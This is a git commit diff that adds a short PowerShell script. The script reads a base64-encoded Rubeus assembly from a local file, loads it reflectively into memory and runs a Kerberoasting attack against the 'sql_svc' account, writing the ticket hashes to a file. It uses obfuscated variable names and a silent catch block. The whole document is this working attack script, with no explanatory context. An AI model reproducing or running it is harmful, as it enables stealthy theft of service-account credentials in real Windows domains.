5962a4eefc329c247440e2316a22c2c970248db6
bejbbiba <98789299+bejbbiba@users.noreply.github.com>
2025-09-25 04:09:52 -0700

    Add files via upload

---
+++ R2/r2.ps1
@@ -0,0 +1,6 @@
+﻿try {
+    $x7z9 = [System.IO.File]::ReadAllText("C:\temp\rubeus_b64.txt").Trim()
+    $y3k2 = [Convert]::FromBase64String($x7z9)
+    $z8m4 = [Reflection.Assembly]::Load($y3k2)
+    $z8m4.EntryPoint.Invoke($null, (,([string[]]("kerberoast /user:sql_svc /outfile:h.txt"))))
+} catch {}
